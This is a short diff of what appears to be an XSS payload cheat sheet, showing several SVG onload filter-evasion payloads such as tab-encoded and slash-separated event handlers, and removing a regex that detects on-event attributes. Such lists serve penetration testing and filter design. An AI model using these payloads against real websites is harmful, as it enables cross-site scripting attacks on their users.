@@ -187,9 +187,9 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 <svg//////onload=alert(1)>  
 <svg id=x;onload=alert(1)>   
 <svg id=`x`onload=alert(1)>
-```
 
-(?i)([\s\"'`;\/0-9\=]+on\w+\s*=)  
+
+
 ```
 <svg onload%09=alert(1)> 
 <svg %09onload=alert(1)>   
